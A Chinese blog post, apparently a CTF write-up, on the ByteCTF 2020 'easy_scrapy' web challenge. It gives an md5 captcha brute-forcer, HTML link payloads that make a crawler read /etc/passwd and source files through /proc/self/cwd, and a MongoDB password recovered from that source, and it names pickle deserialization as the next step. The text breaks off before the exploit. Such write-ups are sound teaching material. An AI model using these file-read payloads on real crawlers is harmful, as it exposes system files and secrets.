<!DOCTYPE html>
<html lang="zh-CN">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF" />
  <meta name="author" content="slug01sh" />
  <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。" />
  
  
  <title>
    
      2020年10月ByteCTF部分web题解 
      
      
      |
    
     slug01sh
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


  
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-WTRCMZDFLE');
    </script>
  

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="slug01sh" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Oranges</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
MathJax = {
  tex: {
    inlineMath: [['$', '$'], ['\\(', '\\)']]
  }
};
</script>



  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">2020年10月ByteCTF部分web题解</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2020-10-25 09:22:59
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="分类"></i>
                
                <span class="span--category">
                  <a href="/categories/CTF/" title="CTF">
                    <b>#</b> CTF
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>用于爆破 md5 的脚本（验证码）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crack.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = input()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(str(i)).startswith(c):</span><br><span class="line">            print(i)</span><br><span class="line">            print(<span class="string">&#x27;----------------&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h1><ul>
<li>题目地址：<a target="_blank" rel="noopener" href="http://101.200.50.18:30010/">http://101.200.50.18:30010/</a></li>
<li>官方题解：<a target="_blank" rel="noopener" href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC</a></li>
<li>oxcccccc：<a target="_blank" rel="noopener" href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></li>
<li>N0rth3题解：<a target="_blank" rel="noopener" href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</a></li>
<li>ByteCTF2020-easyscrapy：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></li>
<li>ByteCTF2020—w4nder：<a target="_blank" rel="noopener" href="http://phoebe233.cn/?p=328#easyscrapy">http://phoebe233.cn/?p=328#easyscrapy</a></li>
</ul>
<p>经过测试，该网站会爬取提交的链接以及链接中的外链，并且提交链接的类型只能是 HTTPS。我当时只在提交链接的部分测试了SSRF，以后在做题时，需要边做边写题解，这样会让自己的思路更加的清晰和正确。</p>
<p>在 服务器编写 1.html ，然后提交 url 即可得到 /etc/passwd 文件，成功本地文件包含，返回结果如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">b&#39;&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;\n&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png"></p>
<p>考虑去读取爬虫的源码，但是并不知道路径，尝试 proc 目录。GET 新姿势，在服务器源码中写入下面的代码并提交。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cmdline&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>proc/self/cmdline 中 /proc/self  是指向当前进程的内存，/proc/self/cmdline 启动进程时执行的命令。类似的接口还有：</p>
<ul>
<li>/proc/$PID/environ 该文件保存进程的环境变量</li>
<li>/proc/$PID/cwd 一个符号连接, 指向进程当前的工作目录</li>
<li>/proc/$PID/exe 一个符号连接, 指向被执行的二进制代码</li>
<li>/proc/$PID/fd 进程所打开的每个文件都有一个符号连接在该子目录里, 以文件描述符命名, 这个名字实际上是指向真正的文件的符号连接</li>
<li>/proc/$PID/attr 进程的属性<br>tip: 当找不到网站路径的时候，可以利用 /proc/self/cwd 目录来读取文件路径</li>
</ul>
<p>当提交请求后的返回结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">b&#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python\x00&#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy\x00crawl\x00byte\x00&#39;</span><br><span class="line"># 解码后：&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy crawl byte</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>b’ 是 Python 的 bytes 类型，表明这个变量在存储的时候是 bytes 类型（二进制形式）。上面的命令可以被化简为 python scrapy crawl byte，这是 scrapy 的启动命令。爬虫的名称叫做 byte，在 spiders 目录中有用。</p>
<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>我们可以参考 <a target="_blank" rel="noopener" href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/topics/commands.html#scrapy">scrapy 的文档</a>，我们可以知道 scrapy 的目录结构（贯穿全文）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">scrapy.cfg</span><br><span class="line">myproject&#x2F;（项目名称，未知）</span><br><span class="line">    __init__.py</span><br><span class="line">    items.py</span><br><span class="line">    pipelines.py</span><br><span class="line">    settings.py</span><br><span class="line">    spiders&#x2F;</span><br><span class="line">        __init__.py</span><br><span class="line">        spider1.py</span><br><span class="line">        spider2.py</span><br><span class="line">        ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>目录结构 +  /proc/self/cwd 来进行文件读取。首先尝试读取 scrapy.cfg 文件（另外的数据需要使用项目名称）。构造 SSRF 的 url 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;scrapy.cfg&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中 /proc/self/cwd/ 指向工作路径（current work directory 简称 cwd），读取工作路径下的 scrapy.cfg 文件。再次提交 url，返回结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># scrapy.cfg</span><br><span class="line"></span><br><span class="line">b&#39;# Automatically created by: scrapy startproject\n#\n# For more information about the [deploy] section see:\n# https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html\n\n[settings]\ndefault &#x3D; bytectf.settings\n\n[deploy]\n#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;\nproject &#x3D; bytectf\n&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这种格式的文本不便于进行阅读，Python 的 Bytes 直接输出就会呈现这种效果，使用 vscode 的替换功能将 \n 转换成“换行”。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png"><br>修改为“正则模式”进行替换，将 “\n” 替换成 “\n”。通过上面的文本，我们就能够读取所有的文件了。</p>
<p>尝试读取 setting 文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;setting.py&quot;&gt;（凭感觉在写代码。。）</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;settings.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>？？？做着做着访问不了了（希望环境没事🙏。等待几分钟后环境恢复，估计是在重启。</p>
<p>参考上面的处理方法，将返回结果整理如下：（参考教程：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fengf233/p/11400262.html%EF%BC%89">https://www.cnblogs.com/fengf233/p/11400262.html）</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># setting.py</span><br><span class="line"></span><br><span class="line">BOT_NAME &#x3D; &#39;bytectf&#39;</span><br><span class="line"># 此Scrapy项目名称</span><br><span class="line"></span><br><span class="line">SPIDER_MODULES &#x3D; [&#39;bytectf.spiders&#39;]</span><br><span class="line"># scrapy查找spider的路径</span><br><span class="line"></span><br><span class="line">NEWSPIDER_MODULE &#x3D; &#39;bytectf.spiders&#39;</span><br><span class="line"># 指定使用genspider时创建spider的路径</span><br><span class="line"></span><br><span class="line">RETRY_ENABLED &#x3D; False</span><br><span class="line"># </span><br><span class="line">ROBOTSTXT_OBEY &#x3D; False</span><br><span class="line"># 表示遵不遵守君子协议，默认False</span><br><span class="line"></span><br><span class="line">DOWNLOAD_TIMEOUT &#x3D; 8</span><br><span class="line"># 超时时间</span><br><span class="line"></span><br><span class="line">USER_AGENT &#x3D; &#39;scrapy_redis&#39;</span><br><span class="line"># 爬虫时使用的默认User-Agent</span><br><span class="line"></span><br><span class="line">SCHEDULER &#x3D; &quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">DUPEFILTER_CLASS &#x3D; &quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">REDIS_HOST &#x3D; &#39;172.20.0.7&#39;</span><br><span class="line"># redis 服务器地址</span><br><span class="line"></span><br><span class="line">REDIS_PORT &#x3D; 6379</span><br><span class="line"># redis 端口</span><br><span class="line"></span><br><span class="line">ITEM_PIPELINES &#x3D; &#123;</span><br><span class="line">&#39;bytectf.pipelines.BytectfPipeline&#39;: 300,</span><br><span class="line">&#125;</span><br><span class="line"># 启用的item管道</span><br></pre></td></tr></table></figure>
<p>在其他人的题解中，他们尝试了攻击 redis，但是没有拿到 shell。我不会（暂时就不尝试了。在这个文件中没有 spider 的名称，考虑从  <strong>init</strong>.py 这个已知的文件入手。尝试读取  <strong>init</strong>.py 文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;spiders&#x2F;__init__.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没有数据</p>
<p>尝试读取 byte.py 文件（暂时还不清楚这个文件名「byte.py」的来源，猜测可能在 items.py、pipelines.py、bytectf/<strong>init</strong>.py 这些没有读取的文件中）。折腾了半天才在启动命令中发现爬虫的名称叫做 byte.py，当时没有理解这个命令的含义，血亏。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;spiders&#x2F;byte.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将回显结果进行整理。代码有点乱，Python 的缩进全无，只能依靠猜测源码大致的模样（\x 乱码使用 print(b””.decode(“utf-8”) 转换为中文)）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># byte.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;byte&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        <span class="comment"># 主键，原始 url</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>, url):</span><br><span class="line">                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list) &gt; <span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试读取前面猜测的文件，items.py、pipelines.py、bytectf/<strong>init</strong>.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;items.py&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;pipelines.py&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;bytectf&#x2F;__init__.py&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>回显结果：</p>
<ol>
<li>items.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># items.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># https://docs.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    byte_start = scrapy.Field()  <span class="comment"># 起始页面</span></span><br><span class="line">    byte_url = scrapy.Field()  <span class="comment"># 当前页面</span></span><br><span class="line">    byte_text = scrapy.Field()  <span class="comment"># text</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>pipelines.py（等等，N0rth3 怎么那么熟悉，出题人可还行，没注意）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pipelines.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line">    <span class="comment"># 连接数据库</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取数据库连接信息</span></span><br><span class="line">        MONGODB_HOST = <span class="string">&#x27;172.20.0.8&#x27;</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_USER = <span class="string">&#x27;N0rth3&#x27;</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(</span><br><span class="line">            <span class="string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(</span><br><span class="line">            MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"><span class="comment"># 处理item</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line"><span class="comment"># 使用dict转换item，然后插入数据库</span></span><br><span class="line">    quote_info = dict(item)</span><br><span class="line">    print(quote_info)</span><br><span class="line">    self.table.insert(quote_info)</span><br><span class="line">    <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>bytectf/<strong>init</strong>.py：空</li>
</ol>
<p>爬虫源码非常简单，全部文件读出来还会发现内网有一台 mongodb 其实为了防止大家跑偏这台 mongodb 特意加了密码，简单想一下就会发现并没有什么能利用的（原因：redis 机器的 ip 不是 localhost，所以拿到 shell 也没用），然后我们继续分析爬虫的源码（不是很能理解）。也就是其中的这段代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># byte.py 片段</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        <span class="comment"># 主键，原始 url</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>, url):</span><br><span class="line">                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list) &gt; <span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到是用 scrapy_redis 写的一个爬虫，功能即接收url，抓取其中的 url 链接然后爬取。</p>
<h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>文件基本读取完成，整理一下已知信息：（分析数据流，然后分析数据流中间危险函数）</p>
<ol>
<li>web 应用将任务传给redis，redis做为 broker（dumps）</li>
<li>爬虫从这个 broker 处获取任务，最后将任务的结果存入 mongodb，最基础的一套分布式应用架构（loads）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png"><br>pickle 函数！！！Python 反序列化漏洞，目前可以确定漏洞类型为 Python 反序列化。</li>
</ol>
<p>题解的exp：</p>
